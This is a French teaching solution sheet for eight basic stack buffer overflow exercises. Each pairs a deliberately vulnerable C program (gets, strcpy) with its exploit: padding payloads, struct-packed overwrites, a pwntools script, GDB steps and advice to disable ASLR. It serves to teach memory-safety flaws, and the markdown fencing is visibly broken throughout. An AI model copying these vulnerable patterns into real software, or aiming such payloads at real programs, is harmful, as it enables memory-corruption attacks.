SOLUTIONS - EXERCICE 15 : BUFFER OVERFLOW BASIQUE

⚠️ Ces solutions sont éducatives. Ne les utilise que sur tes propres systèmes.

═══════════════════════════════════════════════════════════════════════════
DÉFI 1 : ÉCRASER UNE VARIABLE "AUTHENTICATED"
═══════════════════════════════════════════════════════════════════════════

Code vulnérable (defi1.c) :

```c

```c
#include <stdio.h>
#include <string.h>
```


```c
int main() {
    int authenticated = 0;
    char buffer[32];
```

    printf("authenticated @ %p = %d\n", &authenticated, authenticated);
    printf("buffer @ %p\n", buffer);
    printf("Distance : %ld bytes\n", (char*)&authenticated - buffer);

    printf("Entrez password : ");
    gets(buffer);  // VULNÉRABLE

    printf("authenticated = %d\n", authenticated);

    if (authenticated) {
        printf("ACCESS GRANTED\n");
    } else {
        printf("ACCESS DENIED\n");
    }

    return 0;
}
```

Compilation :
gcc -fno-stack-protector -z execstack defi1.c -o defi1

Exploitation :

```bash
# Méthode 1 : 33+ caractères (32 pour remplir buffer + au moins 1)
```
python -c "print('A'*33)" | ./defi1


```bash
# Méthode 2 : Exactement 36 bytes pour écraser les 4 bytes de int
```
python -c "print('A'*36)" | ./defi1

Explication :
- buffer[32] occupe 32 bytes
- authenticated (int) occupe 4 bytes et suit généralement le buffer
- Écrire 33+ caractères déborde de buffer dans authenticated
- N'importe quelle valeur non-nulle dans authenticated passe le test if

═══════════════════════════════════════════════════════════════════════════
DÉFI 2 : BYPASS D'AUTHENTIFICATION
═══════════════════════════════════════════════════════════════════════════

Code (defi2.c) :

```c

```c
#include <stdio.h>
#include <string.h>
```


```c
typedef struct {
    char username[16];
    char password[16];
    int admin;
} Credentials;
```


```c
int main() {
```
    Credentials creds;
    creds.admin = 0;

    printf("Layout:\n");
    printf("  username[16] @ %p\n", creds.username);
    printf("  password[16] @ %p\n", creds.password);
    printf("  admin        @ %p\n", &creds.admin);

    printf("\nUsername : ");
    gets(creds.username);  // VULNÉRABLE

    printf("Password : ");
    gets(creds.password);  // VULNÉRABLE

    printf("\nadmin = %d\n", creds.admin);

    if (creds.admin) {
        printf("ADMIN ACCESS GRANTED\n");
    } else {
        printf("Regular user\n");
    }

    return 0;
}
```

Exploitation :

```bash
# Overflow via username (16 + 16 + quelques bytes)
```
python -c "print('A'*33)" | ./defi2

```bash
# Quand demandé le password, tapez n'importe quoi
```


```bash
# OU overflow via password seulement
# Username: user
# Password: python -c "print('B'*17)"
```

Explication :
- Structure en mémoire : username[16] puis password[16] puis admin (int, 4 bytes)
- Total offset depuis username jusqu'à admin : 16 + 16 = 32 bytes
- Écrire 33+ bytes dans username overflow jusque dans admin

═══════════════════════════════════════════════════════════════════════════
DÉFI 3 : CONTRÔLE PRÉCIS DE LA VALEUR
═══════════════════════════════════════════════════════════════════════════

Code (defi3.c) :

```c

```c
#include <stdio.h>
#include <string.h>
```


```c
int main() {
```
    unsigned int target = 0xDEADBEEF;
    char buffer[64];

    printf("Target @ %p = 0x%08x\n", &target, target);
    printf("Buffer @ %p\n", buffer);

    printf("Payload : ");
    gets(buffer);

    printf("Target = 0x%08x\n", target);

    if (target == 0x41424344) {
        printf("SUCCESS: Target écrasé avec la bonne valeur!\n");
    }

    return 0;
}
```

Exploit Python (exploit3.py) :

```python
import struct


```bash
# Offset : 64 bytes de buffer
```
offset = 64


```bash
# Valeur cible : 0x41424344 (DCBA en ASCII, little-endian)
```
target_value = 0x41424344


```bash
# Générer le payload
```
payload = b'A' * offset + struct.pack('<I', target_value)


```bash
# Afficher pour pipe
```
print(payload.decode('latin1'))
```

Utilisation :
python exploit3.py | ./defi3

Explication :
- buffer[64] = 64 bytes
- target suit immédiatement = offset 64
- struct.pack('<I', 0x41424344) génère \x44\x43\x42\x41 (little-endian)
- Le payload : 64 * 'A' + \x44\x43\x42\x41

═══════════════════════════════════════════════════════════════════════════
DÉFI 4 : ÉCRASEMENT DE POINTEUR
═══════════════════════════════════════════════════════════════════════════

Code (defi4.c) :

```c

```c
#include <stdio.h>
#include <string.h>
```


```c
int main() {
    char buffer[48];
    char *message = "Access Denied";
```

    printf("buffer @ %p\n", buffer);
    printf("message @ %p (pointe vers %p)\n", &message, message);


```c
    // Placer "Access Granted" au début du buffer
```
    strcpy(buffer, "Access Granted");

    printf("\nEntrez input : ");
    gets(buffer + 15);  // Commence après "Access Granted"

    printf("\nMessage : %s\n", message);

    return 0;
}
```

Exploit Python :

```python
import struct


```bash
# Adresse de "Access Granted" dans buffer
# Obtenue en exécutant le programme une fois
```
buffer_addr = 0x7fffffffdb10  # EXEMPLE - change selon ton exécution


```bash
# Offset depuis (buffer+15) jusqu'à message
# buffer[48] - 15 déjà utilisés = 33 bytes restants
```
offset = 33


```bash
# Payload : padding + adresse du buffer
```
payload = b'A' * offset + struct.pack('<Q', buffer_addr)  # Q pour 64-bit

print(payload.decode('latin1'))
```

NOTE : Sur les systèmes avec ASLR, l'adresse change. Utilise GDB pour leak l'adresse
ou désactive ASLR : echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

═══════════════════════════════════════════════════════════════════════════
DÉFI 5 : ANALYSE AVEC GDB
═══════════════════════════════════════════════════════════════════════════

Commandes GDB pour defi1 :


```bash
# Lancer GDB
```
gdb ./defi1


```bash
# Désassembler main
```
(gdb) disas main


```bash
# Breakpoint au début de main
```
(gdb) break main
(gdb) run


```bash
# Examiner les adresses des variables
```
(gdb) info locals


```bash
# Breakpoint avant gets()
```
(gdb) break *[adresse avant call gets]
(gdb) continue


```bash
# Examiner la stack (x86-64)
```
(gdb) x/40gx $rsp


```bash
# Identifier buffer et authenticated
```
(gdb) print &buffer
(gdb) print &authenticated


```bash
# Calculer la distance
```
(gdb) print (char*)&authenticated - buffer


```bash
# Continuer et observer l'écrasement
```
(gdb) continue
[entrer payload]


```bash
# Réexaminer
```
(gdb) x/40gx $rsp
(gdb) print authenticated

Résultat attendu :
- Distance typique : 32 bytes (peut varier avec l'alignement)
- authenticated écrasé avec les caractères excédentaires

═══════════════════════════════════════════════════════════════════════════
DÉFI 6 : VISUALISATION MÉMOIRE
═══════════════════════════════════════════════════════════════════════════

Code (defi6.c) :

```c

```c
#include <stdio.h>
#include <stdint.h>
```


```c
int main() {
    int var1 = 0x11111111;
    char buffer[32];
    int var2 = 0x22222222;
    char buffer2[16];
    int var3 = 0x33333333;
```

    printf("=== LAYOUT MÉMOIRE ===\n\n");

    printf("var1     @ %p = 0x%08x\n", &var1, var1);
    printf("buffer   @ %p (32 bytes)\n", buffer);
    printf("var2     @ %p = 0x%08x\n", &var2, var2);
    printf("buffer2  @ %p (16 bytes)\n", buffer2);
    printf("var3     @ %p = 0x%08x\n", &var3, var3);

    printf("\n=== OFFSETS ===\n\n");
    printf("buffer   - var1    = %ld bytes\n", (char*)buffer - (char*)&var1);
    printf("var2     - buffer  = %ld bytes\n", (char*)&var2 - buffer);
    printf("buffer2  - var2    = %ld bytes\n", (char*)buffer2 - (char*)&var2);
    printf("var3     - buffer2 = %ld bytes\n", (char*)&var3 - buffer2);

    printf("\n=== DUMP HEXADÉCIMAL DE LA STACK ===\n\n");


```c
    // Trouver le début et la fin de la région
```
    uintptr_t start = (uintptr_t)&var1;
    uintptr_t end = (uintptr_t)(&var3 + 1);
    size_t size = end - start;

    unsigned char *ptr = (unsigned char*)start;
    for (size_t i = 0; i < size; i += 16) {
        printf("%p: ", (void*)(ptr + i));
        for (size_t j = 0; j < 16 && i + j < size; j++) {
            printf("%02x ", ptr[i + j]);
        }
        printf("\n");
    }

    return 0;
}
```

═══════════════════════════════════════════════════════════════════════════
DÉFI 7 : PROTECTION AVEC CANARY MANUEL
═══════════════════════════════════════════════════════════════════════════

Code (defi7.c) :

```c

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
```


```c
typedef struct {
```
    unsigned int canary_start;
    char buffer[64];
    unsigned int canary_end;
} ProtectedBuffer;


```c
void init_protected_buffer(ProtectedBuffer *pb) {
```
    srand(time(NULL));
    pb->canary_start = rand();
    pb->canary_end = rand();
    memset(pb->buffer, 0, sizeof(pb->buffer));

    printf("Canaries initialisés:\n");
    printf("  Start: 0x%08x @ %p\n", pb->canary_start, &pb->canary_start);
    printf("  End:   0x%08x @ %p\n", pb->canary_end, &pb->canary_end);
}

int check_integrity(ProtectedBuffer *pb, unsigned int start, unsigned int end) {
    if (pb->canary_start != start) {
        printf("ALERTE: Canary start corrompu! 0x%08x -> 0x%08x\n", start, pb->canary_start);
        return 0;
    }
    if (pb->canary_end != end) {
        printf("ALERTE: Canary end corrompu! 0x%08x -> 0x%08x\n", end, pb->canary_end);
        return 0;
    }
    return 1;
}


```c
int main() {
```
    ProtectedBuffer pb;
    init_protected_buffer(&pb);

    unsigned int original_start = pb.canary_start;
    unsigned int original_end = pb.canary_end;

    printf("\nEntrez données (buffer 64 bytes) : ");
    gets(pb.buffer);  // Intentionnellement vulnérable pour test

    printf("\nVérification d'intégrité...\n");
    if (check_integrity(&pb, original_start, original_end)) {
        printf("✓ Buffer intègre\n");
    } else {
        printf("✗ Overflow détecté!\n");
    }

    return 0;
}
```

Test :

```bash
# Input normal (< 64 bytes)
```
echo "Hello" | ./defi7

```bash
# Résultat : intègre
```


```bash
# Overflow (> 64 bytes)
```
python -c "print('A'*70)" | ./defi7

```bash
# Résultat : canary end corrompu
```

═══════════════════════════════════════════════════════════════════════════
DÉFI 8 : EXPLOITATION DE STRCPY
═══════════════════════════════════════════════════════════════════════════

Code (defi8.c) :

```c

```c
#include <stdio.h>
#include <string.h>
```


```c
void vulnerable(char *input) {
    int marker = 0x12345678;
    char buffer[100];
    int secret = 0xDEADBEEF;
```

    printf("Avant strcpy:\n");
    printf("  marker @ %p = 0x%08x\n", &marker, marker);
    printf("  buffer @ %p\n", buffer);
    printf("  secret @ %p = 0x%08x\n", &secret, secret);

    strcpy(buffer, input);  // VULNÉRABLE

    printf("\nAprès strcpy:\n");
    printf("  marker = 0x%08x\n", marker);
    printf("  secret = 0x%08x\n", secret);

    if (secret != 0xDEADBEEF) {
        printf("\n🚨 SECRET CORROMPU!\n");
    }
}


```c
int main(int argc, char **argv) {
```
    if (argc != 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }

    vulnerable(argv[1]);
    return 0;
}
```

Exploitation :


```bash
# Générer payload de 120 bytes
```
python -c "print('A'*120)" > payload.txt


```bash
# Exécuter
```
./defi8 $(cat payload.txt)


```bash
# Résultat : secret écrasé avec 'AAAA' (0x41414141)
```

Analyse détaillée :
- buffer[100] = 100 bytes
- secret suit à offset 100
- Payload de 120 bytes écrase :
  * buffer[0..99] = 'A'
  * secret (4 bytes) = 'AAAA' (0x41414141)
  * 16 bytes supplémentaires au-delà

═══════════════════════════════════════════════════════════════════════════
TECHNIQUES AVANCÉES
═══════════════════════════════════════════════════════════════════════════

1. Génération de pattern unique (pour trouver l'offset exact) :

```python

```bash
# pattern_gen.py
```
def generate_pattern(length):
    pattern = ""
    for i in range(length):
        pattern += chr(ord('A') + (i % 26))
    return pattern

print(generate_pattern(100))
```

Utilisation :
python pattern_gen.py | ./prog

```bash
# Dans GDB, regarder quelle partie du pattern a écrasé la cible
```

2. Leak d'adresse (bypass ASLR) :

Modifier un programme pour afficher ses propres adresses avant exploitation.

3. Utilisation de pwntools :

```python
from pwn import *


```bash
# Lancer le programme
```
p = process('./defi1')


```bash
# Générer payload
```
payload = b'A' * 36


```bash
# Envoyer
```
p.sendline(payload)


```bash
# Récupérer output
```
print(p.recvall())
```

═══════════════════════════════════════════════════════════════════════════
NOTES IMPORTANTES
═══════════════════════════════════════════════════════════════════════════

- Ces exploits nécessitent -fno-stack-protector (pas de canaries)
- L'alignement mémoire peut varier selon l'architecture et le compilateur
- Utilise GDB pour vérifier les offsets exacts sur ton système
- ASLR doit être désactivé pour certains exploits ou tu dois leak les adresses
- Ces techniques sont ÉDUCATIVES uniquement

